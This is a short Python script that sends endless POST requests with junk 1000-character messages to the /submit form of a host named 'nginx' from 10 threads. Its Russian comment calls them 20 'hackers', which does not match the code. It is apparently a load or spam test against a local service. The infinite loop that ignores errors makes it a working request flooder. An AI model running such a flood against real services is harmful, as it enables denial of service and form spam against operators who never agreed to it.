import requests
from concurrent.futures import ThreadPoolExecutor

URL = "http://nginx/"

def attack():
    while True:
        try:
            requests.post(URL + "submit", data={
                "name": "Bot", "email": "a@b.com", "message": "X" * 1000
            })
        except:
            pass

if __name__ == "__main__":
    # Запускаем 20 "хакеров" одновременно
    with ThreadPoolExecutor(max_workers=10) as executor:
        for _ in range(10):
            executor.submit(attack)